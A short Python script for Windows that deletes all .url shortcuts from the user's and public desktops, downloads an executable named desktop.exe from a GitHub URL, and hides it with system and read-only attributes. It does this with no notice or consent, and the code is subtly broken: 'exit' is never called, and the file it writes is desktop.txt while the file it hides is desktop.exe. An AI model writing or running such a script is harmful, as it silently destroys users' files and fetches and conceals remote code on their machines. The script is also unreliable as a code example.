import os
import requests

path = os.getcwd()
user = os.path.expandvars(r'%userprofile%\Desktop')
public = os.path.expandvars(r'%public%\Desktop')
dirs = [user, public]

for dir in dirs:
    files = os.listdir(dir)
    for file in files:
        if file.endswith(".url"):
            os.remove(os.path.join(dir, file))
os.system("cls")

try:
    r = requests.get("https://raw.githubusercontent.com/thekevie/school-programs/main/desktop.exe")
except Exception:
    exit
    
os.system("attrib -h -s -r desktop.exe")
os.system("echo %CD%")
open("desktop.txt", 'wb').write(r.content)
os.system("attrib +h +s +r desktop.exe")
